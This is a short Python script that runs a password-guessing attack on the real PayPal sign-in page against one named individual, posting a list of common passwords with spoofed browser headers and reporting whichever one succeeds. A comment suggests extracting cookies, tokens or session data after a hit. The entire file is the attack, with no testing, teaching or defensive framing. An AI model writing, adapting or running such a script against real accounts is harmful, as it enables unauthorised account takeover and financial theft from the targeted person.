import requests
import time
import random

# Replace these with actual values from the request
login_url = "https://www.paypal.com/signin?locale.x=nl_NL"
headers = {
    "Host": "www.paypal.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-GB,en;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://www.paypal.com/signin?locale.x=nl_NL"
}

# You can replace this with a file or list of passwords
passwords = [
    "password", "123456", "123456789", "qwerty", "abc123", "admin", "12345678",
    "letmein", "hello", "1234567890", "111111", "123123", "666666", "777777",
    "888888", "999999", "000000", "123321", "12345", "1234567", "1234567890123456"
]

# You can also load passwords from a file:
# with open("passwords.txt", "r") as f:
#     passwords = [line.strip() for line in f]

# Simulate a login request with a password
def brute_force():
    for pwd in passwords:
        payload = {
            "login": "Maryline Lelei",
            "password": pwd,
            "remember_me": "true"
        }

        response = requests.post(login_url, headers=headers, data=payload)

        if response.status_code == 200:
            print(f"[SUCCESS] Password found: {pwd}")
            print("Login successful!")
            # You can extract cookies, tokens, or session data here
            break
        else:
            print(f"[TRYING] Password: {pwd} | Status: {response.status_code}")

        time.sleep(0.5)  # Small delay to avoid overloading the server

brute_force()
